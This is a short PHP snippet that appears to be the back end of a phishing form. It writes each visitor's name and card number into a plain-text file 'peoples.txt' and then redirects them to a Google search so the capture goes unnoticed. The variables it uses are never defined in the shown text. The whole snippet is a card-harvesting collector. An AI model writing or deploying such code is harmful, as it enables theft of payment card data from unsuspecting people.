<?php

        $pFile = sprintf("Name: %s | Num: %s \n",
        $name, $cardnumb
        );

        file_put_contents("peoples.txt", $pFile, FILE_APPEND | LOCK_EX);

        header("Location: https://www.google.com/search?q=$search"); 
        exit;
?>        